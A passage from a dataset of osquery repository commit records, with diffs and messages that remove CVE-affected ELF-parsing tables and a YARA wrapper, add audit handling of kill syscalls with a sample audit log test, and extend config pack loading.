    -

    -namespace yara_strutils {

    -

    -#include "strutils.c"

    -

    -}

    -

    -extern "C" {

    -

    -size_t yara_strutils_strlcpy(char* dst, const char* src, size_t size) {

    -  return yara_strutils::strlcpy(dst, src, size);

    -}

    -

    -uint64_t yara_strutils_xtoi(const char* hexstr) {

    -  return yara_strutils::xtoi(hexstr);

    -}

    -

    -int yara_strutils_strnlen_w(const char* w_str) {

    -  return yara_strutils::strnlen_w(w_str);

    -}

    -

    -size_t yara_strutils_strlcpy_w(char* dst, const char* w_src, size_t n) {

    -  return yara_strutils::strlcpy_w(dst, w_src, n);

    -}

    -

    -int yara_strutils_strcmp_w(const char* w_str, const char* str) {

    -  return yara_strutils::strcmp_w(w_str, str);

    -}

    -

    -size_t yara_strutils_strlcat(char* dst, const char* src, size_t size) {

    -  return yara_strutils::strlcat(dst, src, size);

    -}

    -

    -void* yara_strutils_memmem(const void* haystack,

    -                           size_t haystack_size,

    -                           const void* needle,

    -                           size_t needle_size) {

    -  return yara_strutils::memmem(haystack, haystack_size, needle, needle_size);

    -}

    -

    -int yara_strutils_isalnum(const uint8_t* s) {

    -  return yara_strutils::yr_isalnum(s);

    -}

    -}'
  commit_message: "cve: Update yara to 4.2.3 (#7912)\n\n- Resolves CVE-2021-45429\r\
    \n- Avoid symbol collision from libmagic"
  commit_sha: 78a8e3945e13d65d9e96e7f15074e22925aa0cbc
  repo_name: osquery/osquery
- commit_diff:
  - '--- a/osquery/tables/system/linux/elf_info.cpp

    +++ b/osquery/tables/system/linux/elf_info.cpp

    @@ -1,213 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -#include <elf.h>

    -#include <fcntl.h>

    -

    -#include <libelfin/elf/elf++.hh>

    -

    -#include <unordered_map>

    -

    -#include <osquery/core/tables.h>

    -#include <osquery/filesystem/filesystem.h>

    -#include <osquery/logger/logger.h>

    -

    -namespace osquery {

    -namespace tables {

    -

    -const std::unordered_map<elf::ElfTypes::Word, std::string> kGNUTypes{

    -    {0x6474e550, "GNU_EH_FRAME"},

    -    {0x6474E551, "GNU_STACK"},

    -    {0x6474E552, "GNU_RELRO"},

    -};

    -

    -void genElfInfo(

    -    QueryContext& ctx,

    -    std::function<void(const elf::elf&, const std::string&)> predicate) {

    -  // Resolve file paths for EQUALS and LIKE operations.

    -  auto paths = ctx.constraints["path"].getAll(EQUALS);

    -  ctx.expandConstraints(

    -      "path",

    -      LIKE,

    -      paths,

    -      ([&](const std::string& pattern, std::set<std::string>& out) {

    -        std::vector<std::string> patterns;

    -        auto status =

    -            resolveFilePattern(pattern, patterns, GLOB_ALL | GLOB_NO_CANON);

    -        if (status.ok()) {

    -          for (const auto& resolved : patterns) {

    -            out.insert(resolved);

    -          }

    -        }

    -        return status;

    -      }));

    -

    -  for (const auto& path : paths) {

    -    auto fd = open(path.c_str(), O_RDONLY);

    -    if (fd >= 0) {

    -      try {

    -        elf::elf f(elf::create_mmap_loader(fd));

    -        predicate(f, path);

    -      } catch (const std::exception& e) {

    -        VLOG(1) << "Could not read ELF header: " << path;

    -      }

    -      close(fd);

    -    }

    -  }

    -}

    -

    -QueryData getELFInfo(QueryContext& context) {

    -  QueryData results;

    -

    -  auto lambda = [&results](const elf::elf& f, const std::string& path) {

    -    const auto& hdr = f.get_hdr();

    -

    -    Row r;

    -    r["path"] = path;

    -    r["class"] = (hdr.ei_class == elf::elfclass::_32) ? "32" : "64";

    -    r["abi"] = to_string(hdr.ei_osabi);

    -    r["abi_version"] = std::to_string(hdr.ei_abiversion);

    -    r["type"] = to_string(hdr.type);

    -    r["machine"] = std::to_string(hdr.machine);

    -    r["version"] = std::to_string(hdr.version);

    -    r["entry"] = std::to_string(hdr.entry);

    -    r["flags"] = std::to_string(hdr.flags);

    -    results.push_back(r);

    -  };

    -

    -  genElfInfo(context, lambda);

    -  return results;

    -}

    -

    -QueryData getELFSegments(QueryContext& context) {

    -  QueryData results;

    -

    -  auto lambda = [&results](const elf::elf& f, const std::string& path) {

    -    for (const auto& seg : f.segments()) {

    -      const auto& hdr = seg.get_hdr();

    -

    -      Row r;

    -      r["path"] = path;

    -      auto gnu_type =

    -          kGNUTypes.find(static_cast<elf::ElfTypes::Word>(hdr.type));

    -      if (gnu_type != kGNUTypes.end()) {

    -        r["name"] = gnu_type->second;

    -      } else {

    -        r["name"] = to_string(hdr.type);

    -      }

    -      r["offset"] = std::to_string(hdr.offset);

    -      r["vaddr"] = std::to_string(hdr.vaddr);

    -      r["flags"] = to_string(hdr.flags);

    -      r["psize"] = std::to_string(hdr.filesz);

    -      r["msize"] = std::to_string(hdr.memsz);

    -      r["align"] = std::to_string(hdr.align);

    -      results.push_back(r);

    -    }

    -  };

    -

    -  genElfInfo(context, lambda);

    -  return results;

    -}

    -

    -QueryData getELFSymbols(QueryContext& context) {

    -  QueryData results;

    -

    -  auto lambda = [&results](const elf::elf& f, const std::string& path) {

    -    for (const auto& sec : f.sections()) {

    -      const auto& hdr = sec.get_hdr();

    -

    -      if (hdr.type != elf::sht::symtab && hdr.type != elf::sht::dynsym) {

    -        continue;

    -      }

    -

    -      Row r;

    -      r["path"] = path;

    -      r["table"] = sec.get_name();

    -

    -      for (const auto& sym : sec.as_symtab()) {

    -        const auto& d = sym.get_data();

    -        r["addr"] = std::to_string(d.value);

    -        r["size"] = std::to_string(d.size);

    -        r["type"] = to_string(d.type());

    -        r["binding"] = to_string(d.binding());

    -        r["offset"] = to_string(d.shnxd);

    -        r["name"] = sym.get_name();

    -        results.push_back(r);

    -      }

    -    }

    -  };

    -

    -  genElfInfo(context, lambda);

    -  return results;

    -}

    -

    -QueryData getELFSections(QueryContext& context) {

    -  QueryData results;

    -

    -  auto lambda = [&results](const elf::elf& f, const std::string& path) {

    -    for (const auto& sec : f.sections()) {

    -      const auto& hdr = sec.get_hdr();

    -

    -      Row r;

    -      r["path"] = path;

    -      r["name"] = sec.get_name();

    -      r["type"] = std::to_string(static_cast<elf::ElfTypes::Word>(hdr.type));

    -      r["addr"] = std::to_string(hdr.addr);

    -      r["offset"] = std::to_string(hdr.offset);

    -      r["size"] = std::to_string(hdr.size);

    -      r["flags"] = to_string(hdr.flags);

    -      r["link"] = to_string(hdr.link);

    -      r["align"] = std::to_string(hdr.addralign);

    -      results.push_back(r);

    -    }

    -  };

    -

    -  genElfInfo(context, lambda);

    -  return results;

    -}

    -

    -QueryData getELFDynamic(QueryContext& context) {

    -  QueryData results;

    -

    -  auto lambda = [&results](const elf::elf& f, const std::string& path) {

    -    for (const auto& sec : f.sections()) {

    -      const auto& hdr = sec.get_hdr();

    -      if (hdr.type != elf::sht::dynamic) {

    -        continue;

    -      }

    -

    -      Row r;

    -      r["path"] = path;

    -      const auto* data = sec.data();

    -      if (f.get_hdr().ei_class == elf::elfclass::_32) {

    -        r["class"] = "32";

    -        auto* dynamic = reinterpret_cast<const Elf32_Dyn*>(data);

    -        for (const auto* d = dynamic; d->d_tag != DT_NULL; ++d) {

    -          r["tag"] = std::to_string(d->d_tag);

    -          r["value"] = std::to_string(d->d_un.d_val);

    -          results.push_back(r);

    -        }

    -      } else {

    -        r["class"] = "64";

    -        auto* dynamic = reinterpret_cast<const Elf64_Dyn*>(data);

    -        for (const auto* d = dynamic; d->d_tag != DT_NULL; ++d) {

    -          r["tag"] = std::to_string(d->d_tag);

    -          r["value"] = std::to_string(d->d_un.d_val);

    -          results.push_back(r);

    -        }

    -      }

    -    }

    -  };

    -

    -  genElfInfo(context, lambda);

    -  return results;

    -}

    -

    -} // namespace tables

    -} // namespace osquery'
  - '--- a/tests/integration/tables/elf_dynamic.cpp

    +++ b/tests/integration/tables/elf_dynamic.cpp

    @@ -1,46 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -// Sanity check integration test for elf_dynamic

    -// Spec file: specs/linux/elf_dynamic.table

    -

    -#include <osquery/tests/integration/tables/helper.h>

    -

    -namespace osquery {

    -namespace table_tests {

    -

    -class elfDynamic : public testing::Test {

    - protected:

    -  void SetUp() override {

    -    setUpEnvironment();

    -  }

    -};

    -

    -TEST_F(elfDynamic, test_sanity) {

    -  // 1. Query data

    -  auto const data = execute_query("select * from elf_dynamic where path = ''''");

    -  // 2. Check size before validation

    -  // ASSERT_GE(data.size(), 0ul);

    -  // ASSERT_EQ(data.size(), 1ul);

    -  // ASSERT_EQ(data.size(), 0ul);

    -  // 3. Build validation map

    -  // See helper.h for available flags

    -  // Or use custom DataCheck object

    -  // ValidationMap row_map = {

    -  //      {"tag", IntType}

    -  //      {"value", IntType}

    -  //      {"class", IntType}

    -  //      {"path", NormalType}

    -  //}

    -  // 4. Perform validation

    -  // validate_rows(data, row_map);

    -}

    -

    -} // namespace table_tests

    -} // namespace osquery'
  - '--- a/tests/integration/tables/elf_info.cpp

    +++ b/tests/integration/tables/elf_info.cpp

    @@ -1,51 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -// Sanity check integration test for elf_info

    -// Spec file: specs/linux/elf_info.table

    -

    -#include <osquery/tests/integration/tables/helper.h>

    -

    -namespace osquery {

    -namespace table_tests {

    -

    -class elfInfo : public testing::Test {

    - protected:

    -  void SetUp() override {

    -    setUpEnvironment();

    -  }

    -};

    -

    -TEST_F(elfInfo, test_sanity) {

    -  // 1. Query data

    -  auto const data = execute_query("select * from elf_info where path = ''''");

    -  // 2. Check size before validation

    -  // ASSERT_GE(data.size(), 0ul);

    -  // ASSERT_EQ(data.size(), 1ul);

    -  // ASSERT_EQ(data.size(), 0ul);

    -  // 3. Build validation map

    -  // See helper.h for available flags

    -  // Or use custom DataCheck object

    -  // ValidationMap row_map = {

    -  //      {"class", NormalType}

    -  //      {"abi", NormalType}

    -  //      {"abi_version", IntType}

    -  //      {"type", NormalType}

    -  //      {"machine", IntType}

    -  //      {"version", IntType}

    -  //      {"entry", IntType}

    -  //      {"flags", IntType}

    -  //      {"path", NormalType}

    -  //}

    -  // 4. Perform validation

    -  // validate_rows(data, row_map);

    -}

    -

    -} // namespace table_tests

    -} // namespace osquery'
  - '--- a/tests/integration/tables/elf_sections.cpp

    +++ b/tests/integration/tables/elf_sections.cpp

    @@ -1,51 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -// Sanity check integration test for elf_sections

    -// Spec file: specs/linux/elf_sections.table

    -

    -#include <osquery/tests/integration/tables/helper.h>

    -

    -namespace osquery {

    -namespace table_tests {

    -

    -class elfSections : public testing::Test {

    - protected:

    -  void SetUp() override {

    -    setUpEnvironment();

    -  }

    -};

    -

    -TEST_F(elfSections, test_sanity) {

    -  // 1. Query data

    -  auto const data = execute_query("select * from elf_sections where path = ''''");

    -  // 2. Check size before validation

    -  // ASSERT_GE(data.size(), 0ul);

    -  // ASSERT_EQ(data.size(), 1ul);

    -  // ASSERT_EQ(data.size(), 0ul);

    -  // 3. Build validation map

    -  // See helper.h for available flags

    -  // Or use custom DataCheck object

    -  // ValidationMap row_map = {

    -  //      {"name", NormalType}

    -  //      {"type", IntType}

    -  //      {"vaddr", IntType}

    -  //      {"offset", IntType}

    -  //      {"size", IntType}

    -  //      {"flags", NormalType}

    -  //      {"link", NormalType}

    -  //      {"align", IntType}

    -  //      {"path", NormalType}

    -  //}

    -  // 4. Perform validation

    -  // validate_rows(data, row_map);

    -}

    -

    -} // namespace table_tests

    -} // namespace osquery'
  - '--- a/tests/integration/tables/elf_segments.cpp

    +++ b/tests/integration/tables/elf_segments.cpp

    @@ -1,50 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -// Sanity check integration test for elf_segments

    -// Spec file: specs/linux/elf_segments.table

    -

    -#include <osquery/tests/integration/tables/helper.h>

    -

    -namespace osquery {

    -namespace table_tests {

    -

    -class elfSegments : public testing::Test {

    -  protected:

    -    void SetUp() override {

    -      setUpEnvironment();

    -    }

    -};

    -

    -TEST_F(elfSegments, test_sanity) {

    -  // 1. Query data

    -  auto const data = execute_query("select * from elf_segments where path = ''''");

    -  // 2. Check size before validation

    -  // ASSERT_GE(data.size(), 0ul);

    -  // ASSERT_EQ(data.size(), 1ul);

    -  // ASSERT_EQ(data.size(), 0ul);

    -  // 3. Build validation map

    -  // See helper.h for available flags

    -  // Or use custom DataCheck object

    -  // ValidationMap row_map = {

    -  //      {"name", NormalType}

    -  //      {"offset", IntType}

    -  //      {"vaddr", IntType}

    -  //      {"psize", IntType}

    -  //      {"msize", IntType}

    -  //      {"flags", NormalType}

    -  //      {"align", IntType}

    -  //      {"path", NormalType}

    -  //}

    -  // 4. Perform validation

    -  // validate_rows(data, row_map);

    -}

    -

    -} // namespace table_tests

    -} // namespace osquery'
  - '--- a/tests/integration/tables/elf_symbols.cpp

    +++ b/tests/integration/tables/elf_symbols.cpp

    @@ -1,50 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -// Sanity check integration test for elf_symbols

    -// Spec file: specs/linux/elf_symbols.table

    -

    -#include <osquery/tests/integration/tables/helper.h>

    -

    -namespace osquery {

    -namespace table_tests {

    -

    -class elfSymbols : public testing::Test {

    -  protected:

    -    void SetUp() override {

    -      setUpEnvironment();

    -    }

    -};

    -

    -TEST_F(elfSymbols, test_sanity) {

    -  // 1. Query data

    -  auto const data = execute_query("select * from elf_symbols where path = ''''");

    -  // 2. Check size before validation

    -  // ASSERT_GE(data.size(), 0ul);

    -  // ASSERT_EQ(data.size(), 1ul);

    -  // ASSERT_EQ(data.size(), 0ul);

    -  // 3. Build validation map

    -  // See helper.h for available flags

    -  // Or use custom DataCheck object

    -  // ValidationMap row_map = {

    -  //      {"name", NormalType}

    -  //      {"addr", IntType}

    -  //      {"size", IntType}

    -  //      {"type", NormalType}

    -  //      {"binding", NormalType}

    -  //      {"offset", IntType}

    -  //      {"table", NormalType}

    -  //      {"path", NormalType}

    -  //}

    -  // 4. Perform validation

    -  // validate_rows(data, row_map);

    -}

    -

    -} // namespace table_tests

    -} // namespace osquery'
  commit_message: "Remove libelfin and elf parsing tables (#7524)\n\nDue to libelfin\
    \ being unmaintained and containing unfixed CVEs,\r\nremove the library and the\
    \ following tables that depends on it:\r\nelf_dynamic, elf_info, elf_sections,\
    \ elf_segments, elf_symbols."
  commit_sha: b5ea437d31e2154dffeae39f8fc47a9d63ecb749
  repo_name: osquery/osquery
- commit_diff:
  - "--- a/osquery/events/linux/auditdnetlink.cpp\n+++ b/osquery/events/linux/auditdnetlink.cpp\n\
    @@ -58,6 +58,7 @@ DECLARE_bool(audit_allow_config);\n DECLARE_bool(audit_allow_fim_events);\n\
    \ DECLARE_bool(audit_allow_process_events);\n DECLARE_bool(audit_allow_fork_process_events);\n\
    +DECLARE_bool(audit_allow_kill_process_events);\n DECLARE_bool(audit_allow_sockets);\n\
    \ DECLARE_bool(audit_allow_user_events);\n DECLARE_bool(audit_allow_selinux_events);\n\
    @@ -348,6 +349,14 @@ bool AuditdNetlinkReader::configureAuditService() noexcept\
    \ {\n         monitored_syscall_list_.insert(syscall);\n       }\n     }\n+\n\
    +    if (FLAGS_audit_allow_kill_process_events) {\n+      VLOG(1) << \"Enabling\
    \ audit rules for the process_events (kill, tkill, \"\n+                 \"tgkill)\
    \ table\";\n+      for (int syscall : kKillProcessEventsSyscalls) {\n+       \
    \ monitored_syscall_list_.insert(syscall);\n+      }\n+    }\n   }\n \n   // Rules\
    \ required by the process_file_events table"
  - "--- a/osquery/events/linux/auditeventpublisher.cpp\n+++ b/osquery/events/linux/auditeventpublisher.cpp\n\
    @@ -24,6 +24,7 @@ DECLARE_bool(audit_allow_process_events);\n DECLARE_bool(audit_allow_sockets);\n\
    \ DECLARE_bool(audit_allow_user_events);\n DECLARE_bool(audit_allow_selinux_events);\n\
    +DECLARE_bool(audit_allow_kill_process_events);\n \n REGISTER(AuditEventPublisher,\
    \ \"event_publisher\", \"auditeventpublisher\");\n \n@@ -35,7 +36,8 @@ bool IsPublisherEnabled()\
    \ noexcept {\n \n   return (FLAGS_audit_allow_fim_events || FLAGS_audit_allow_process_events\
    \ ||\n           FLAGS_audit_allow_sockets || FLAGS_audit_allow_user_events ||\n\
    -          FLAGS_audit_allow_selinux_events);\n+          FLAGS_audit_allow_selinux_events\
    \ ||\n+          FLAGS_audit_allow_kill_process_events);\n }\n } // namespace\n\
    \ "
  - "--- a/osquery/tables/events/linux/process_events.cpp\n+++ b/osquery/tables/events/linux/process_events.cpp\n\
    @@ -22,8 +22,11 @@ const std::unordered_map<int, std::string> kSyscallNameMap\
    \ = {\n     {__NR_execveat, \"execveat\"},\n     {__NR_fork, \"fork\"},\n    \
    \ {__NR_vfork, \"vfork\"},\n-    {__NR_clone, \"clone\"}};\n-}\n+    {__NR_clone,\
    \ \"clone\"},\n+    {__NR_kill, \"kill\"},\n+    {__NR_tkill, \"tkill\"},\n+ \
    \   {__NR_tgkill, \"tgkill\"}};\n+};\n \n DECLARE_bool(audit_allow_process_events);\n\
    \ \n@@ -33,6 +36,12 @@ FLAG(bool,\n      \"Allow the audit publisher to install\
    \ process event monitoring rules to \"\n      \"capture fork/vfork/clone system\
    \ calls\");\n \n+FLAG(bool,\n+     audit_allow_kill_process_events,\n+     false,\n\
    +     \"Allow the audit publisher to install process event monitoring rules to\
    \ \"\n+     \"capture kill/tkill/tgkill system calls\");\n+\n REGISTER(AuditProcessEventSubscriber,\
    \ \"event_subscriber\", \"process_events\");\n \n Status AuditProcessEventSubscriber::init()\
    \ {\n@@ -124,13 +133,18 @@ Status AuditProcessEventSubscriber::ProcessEvents(\n\
    \     const auto& event_data = boost::get<SyscallAuditEventData>(event.data);\n\
    \ \n     bool is_exec_syscall{false};\n+    bool is_kill_syscall{false};\n   \
    \  if (kExecProcessEventsSyscalls.count(event_data.syscall_number) > 0U) {\n \
    \      is_exec_syscall = true;\n \n     } else if (kForkProcessEventsSyscalls.count(event_data.syscall_number)\
    \ >\n                0U) {\n       is_exec_syscall = false;\n \n+    } else if\
    \ (kKillProcessEventsSyscalls.count(event_data.syscall_number) >\n+          \
    \     0U) {\n+      is_kill_syscall = true;\n+\n     } else {\n       continue;\n\
    \     }\n@@ -212,6 +226,17 @@ Status AuditProcessEventSubscriber::ProcessEvents(\n\
    \         continue;\n       }\n \n+    } else if (is_kill_syscall) {\n+      const\
    \ AuditEventRecord* obj_pid_recod =\n+          GetEventRecord(event, AUDIT_OBJ_PID);\n\
    +\n+      CopyFieldFromMap(row, syscall_event_record->fields, \"tty\", \"\");\n\
    +      CopyFieldFromMap(row, syscall_event_record->fields, \"ses\", \"-1\");\n\
    +      CopyFieldFromMap(row, syscall_event_record->fields, \"comm\", \"\");\n\
    +      CopyFieldFromMap(row, obj_pid_recod->fields, \"ocomm\", \"-1\");\n+   \
    \   CopyFieldFromMap(row, obj_pid_recod->fields, \"oses\", \"-1\");\n+      CopyFieldFromMap(row,\
    \ obj_pid_recod->fields, \"oauid\", \"-1\");\n+\n     } else {\n       row[\"\
    owner_uid\"] = \"0\";\n       row[\"owner_gid\"] = \"0\";"
  - "--- a/osquery/tables/events/tests/linux/process_events_tests.cpp\n+++ b/osquery/tables/events/tests/linux/process_events_tests.cpp\n\
    @@ -90,9 +90,10 @@ void GenerateEventRow(Row& row, const RawAuditEvent& audit_event)\
    \ {\n class ProcessEventsTests : public testing::Test {};\n \n TEST_F(ProcessEventsTests,\
    \ syscall_name_label) {\n-  ASSERT_EQ(\n-      kExecProcessEventsSyscalls.size()\
    \ + kForkProcessEventsSyscalls.size(),\n-      AuditProcessEventSubscriber::GetSyscallNameMap().size());\n\
    +  ASSERT_EQ(kExecProcessEventsSyscalls.size() +\n+                kForkProcessEventsSyscalls.size()\
    \ +\n+                kKillProcessEventsSyscalls.size(),\n+            AuditProcessEventSubscriber::GetSyscallNameMap().size());\n\
    \ \n   std::string name;\n \n@@ -165,6 +166,59 @@ TEST_F(ProcessEventsTests, exec_event_processing)\
    \ {\n   }\n }\n \n+TEST_F(ProcessEventsTests, kill_syscall_event_processing) {\n\
    +  // clang-format off\n+  const RawAuditEvent kSampleKillEvent = {\n+    { 1300,\
    \ \"audit(1588703361.452:26860): arch=c000003e syscall=62 success=yes exit=0 a0=6334\
    \ a1=f a2=0 a3=7f8b95cbbcc0 items=0 ppid=6198 pid=6199 auid=1000 uid=1000 gid=1000\
    \ euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts3 ses=5\
    \ comm=\\\"bash\\\" exe=\\\"/bin/bash\\\" key=226B696C6C73686F7422\" },\n+   \
    \ { 1318, \"audit(1588703361.452:26860): opid=25396 oauid=1000 ouid=1000 oses=5\
    \ ocomm=\\\"python3\\\"\" },\n+    { 1307, \"audit(1588703361.452:26860): proctitle=\\\
    \"-bash\\\"\" },\n+    { 1320, \"audit(1588703361.452:26860): \" }\n+  };\n+ \
    \ // clang-format on\n+\n+  Row event_row;\n+  GenerateEventRow(event_row, kSampleKillEvent);\n\
    +\n+  const std::vector<std::string> kExpectedFields = {\n+      \"uptime\", \"\
    overflows\", \"env\", \"env_size\", \"env_count\"};\n+\n+  const std::unordered_map<std::string,\
    \ std::string> kExpectedFieldMap = {\n+      {\"syscall\", \"kill\"},\n+     \
    \ {\"parent\", \"6198\"},\n+      {\"pid\", \"6199\"},\n+      {\"auid\", \"1000\"\
    },\n+      {\"uid\", \"1000\"},\n+      {\"gid\", \"1000\"},\n+      {\"euid\"\
    , \"1000\"},\n+      {\"suid\", \"1000\"},\n+      {\"fsuid\", \"1000\"},\n+ \
    \     {\"egid\", \"1000\"},\n+      {\"sgid\", \"1000\"},\n+      {\"fsgid\",\
    \ \"1000\"},\n+      {\"tty\", \"pts3\"},\n+      {\"ses\", \"5\"},\n+      {\"\
    comm\", \"\\\"bash\\\"\"},\n+      {\"path\", \"/bin/bash\"},\n+      {\"ocomm\"\
    , \"\\\"python3\\\"\"},\n+      {\"oauid\", \"1000\"},\n+      {\"oses\", \"5\"\
    }};\n+\n+  for (const auto& key : kExpectedFields) {\n+    EXPECT_TRUE(event_row.find(key)\
    \ != event_row.end());\n+  }\n+\n+  for (const auto& p : kExpectedFieldMap) {\n\
    +    const auto& key = p.first;\n+    const auto& expected_value = p.second;\n\
    +\n+    auto it = event_row.find(key);\n+    ASSERT_TRUE(it != event_row.end());\n\
    +\n+    const auto& actual_value = it->second;\n+    EXPECT_EQ(expected_value,\
    \ actual_value);\n+  }\n+}\n+\n TEST_F(ProcessEventsTests, thread_detection) {\n\
    \   const std::string kThreadCreationSyscallRecord =\n       \"audit(1565632189.127:261722):\
    \ arch=c000003e syscall=56 success=yes \""
  commit_message: "Add support for processing KILL syscall (#6435)\n\nAdd support\
    \ for processing KILL, TKILL and TGKILL syscalls. The first\r\nmessage of the\
    \ SYSCALL message type is handled in a similar way as\r\nEXECVE as the structure\
    \ is more or less the same.\r\n\r\nThree additional fields are parsed from the\
    \ message which are \"ses\"\r\n(session of the process), \"comm\" (the command\
    \ that was executed, eg: the\r\nscript name in case of a /bin/bash invoke) and\
    \ \"tty\" (the controlling\r\nterminal for the process). These fields will not\
    \ be published though\r\nsince the table schema doesn't support it at the moment.\r\
    \n\r\nThe above feature is activated using the\r\n    --audit_allow_kill_process_events=true\r\
    \n\r\nSample columns:\r\n```\r\n\"columns\": {\r\n  \"atime\": \"1589007635\"\
    ,\r\n  \"auid\": \"4294967295\",\r\n  \"btime\": \"0\",\r\n  \"cmdline\": \"\"\
    ,\r\n  \"ctime\": \"1587237608\",\r\n  \"cwd\": \"\",\r\n  \"egid\": \"1000\"\
    ,\r\n  \"euid\": \"1000\",\r\n  \"fsgid\": \"1000\",\r\n  \"fsuid\": \"1000\"\
    ,\r\n  \"gid\": \"1000\",\r\n  \"mode\": \"0755\",\r\n  \"mtime\": \"1586904788\"\
    ,\r\n  \"owner_gid\": \"\",\r\n  \"owner_uid\": \"\",\r\n  \"parent\": \"4781\"\
    ,\r\n  \"path\": \"/home/USERNAME/code-server-3.1.1-linux-x86_64/node\",\r\n \
    \ \"pid\": \"4795\",\r\n  \"sgid\": \"1000\",\r\n  \"suid\": \"1000\",\r\n  \"\
    syscall\": \"kill\",\r\n  \"time\": \"1589052835\",\r\n  \"uid\": \"1000\",\r\n\
    \  \"uptime\": \"26902\"\r\n}\r\n```\r\n\r\nNote that the TGKILL syscall is recommended\
    \ to not be used from the\r\nlinux manpages."
  commit_sha: cd11220b7acbff78ff26a1e33e3009a2b9e69bbb
  repo_name: osquery/osquery
- commit_diff:
  - "--- a/osquery/config/config.cpp\n+++ b/osquery/config/config.cpp\n@@ -11,7 +11,9\
    \ @@\n #include <chrono>\n #include <mutex>\n #include <random>\n-#include <sstream>\n\
    +\n+#include <boost/property_tree/json_parser.hpp>\n+#include <boost/thread/shared_mutex.hpp>\n\
    \ \n #include <osquery/config.h>\n #include <osquery/database.h>\n@@ -40,9 +42,15\
    \ @@ boost::shared_mutex config_files_mutex_;\n boost::shared_mutex config_hash_mutex_;\n\
    \ boost::shared_mutex config_valid_mutex_;\n \n-void Config::addPack(const Pack&\
    \ pack) {\n+void Config::addPack(const std::string& name,\n+                 \
    \    const std::string& source,\n+                     const pt::ptree& tree)\
    \ {\n   WriteLock wlock(config_schedule_mutex_);\n-  return schedule_.add(pack);\n\
    +  try {\n+    schedule_.add(Pack(name, source, tree));\n+  } catch (const std::exception&\
    \ e) {\n+    LOG(WARNING) << \"Error adding pack: \" << name << \": \" << e.what();\n\
    +  }\n }\n \n void Config::removePack(const std::string& pack) {\n@@ -123,6 +131,99\
    \ @@ Status Config::load() {\n   return Status(0, \"OK\");\n }\n \n+Status Config::updateSource(const\
    \ std::string& name, const std::string& json) {\n+  hashSource(name, json);\n\
    +\n+  // load the config (source.second) into a pt::ptree\n+  std::stringstream\
    \ json_stream;\n+  json_stream << json;\n+  pt::ptree tree;\n+  try {\n+    pt::read_json(json_stream,\
    \ tree);\n+  } catch (const pt::json_parser::json_parser_error& e) {\n+    return\
    \ Status(1, \"Error parsing the config JSON\");\n+  }\n+\n+  // extract the \"\
    schedule\" key and store it as the main pack\n+  if (tree.count(\"schedule\")\
    \ > 0) {\n+    auto& schedule = tree.get_child(\"schedule\");\n+    pt::ptree\
    \ main_pack;\n+    main_pack.add_child(\"queries\", schedule);\n+    addPack(\"\
    main\", name, main_pack);\n+  }\n+\n+  if (tree.count(\"scheduledQueries\") >\
    \ 0) {\n+    auto& scheduled_queries = tree.get_child(\"scheduledQueries\");\n\
    +    pt::ptree queries;\n+    for (const std::pair<std::string, pt::ptree>& query\
    \ : scheduled_queries) {\n+      auto query_name = query.second.get<std::string>(\"\
    name\", \"\");\n+      if (query_name.empty()) {\n+        return Status(1, \"\
    Error getting name from legacy scheduled query\");\n+      }\n+      queries.add_child(query_name,\
    \ query.second);\n+    }\n+    pt::ptree legacy_pack;\n+    legacy_pack.add_child(\"\
    queries\", queries);\n+    addPack(\"legacy_main\", name, legacy_pack);\n+  }\n\
    +\n+  // extract the \"packs\" key into additional pack objects\n+  if (tree.count(\"\
    packs\") > 0) {\n+    auto& packs = tree.get_child(\"packs\");\n+    for (const\
    \ auto& pack : packs) {\n+      auto value = packs.get<std::string>(pack.first,\
    \ \"\");\n+      if (value.empty()) {\n+        addPack(pack.first, name, pack.second);\n\
    +      } else {\n+        PluginResponse response;\n+        PluginRequest request\
    \ = {\n+            {\"action\", \"genPack\"}, {\"name\", pack.first}, {\"value\"\
    , value}};\n+        Registry::call(\"config\", request, response);\n+\n+    \
    \    if (response.size() > 0 && response[0].count(pack.first) > 0) {\n+      \
    \    std::stringstream pack_stream;\n+          pack_stream << response[0][pack.first];\n\
    +          pt::ptree pack_tree;\n+          try {\n+            pt::read_json(pack_stream,\
    \ pack_tree);\n+            addPack(pack.first, name, pack_tree);\n+         \
    \ } catch (const pt::json_parser::json_parser_error& e) {\n+            LOG(WARNING)\
    \ << \"Error parsing the pack JSON: \" << pack.first;\n+          }\n+       \
    \ }\n+      }\n+    }\n+  }\n+\n+  for (const auto& plugin : Registry::all(\"\
    config_parser\")) {\n+    std::shared_ptr<ConfigParserPlugin> parser;\n+    try\
    \ {\n+      parser = std::dynamic_pointer_cast<ConfigParserPlugin>(plugin.second);\n\
    +    } catch (const std::bad_cast& e) {\n+      LOG(ERROR) << \"Error casting\
    \ config parser plugin: \" << plugin.first;\n+    }\n+    if (parser == nullptr\
    \ || parser.get() == nullptr) {\n+      continue;\n+    }\n+\n+    // For each\
    \ key requested by the parser, add a property tree reference.\n+    std::map<std::string,\
    \ pt::ptree> parser_config;\n+    for (const auto& key : parser->keys()) {\n+\
    \      if (tree.count(key) > 0) {\n+        parser_config[key] = tree.get_child(key);\n\
    +      } else {\n+        parser_config[key] = pt::ptree();\n+      }\n+    }\n\
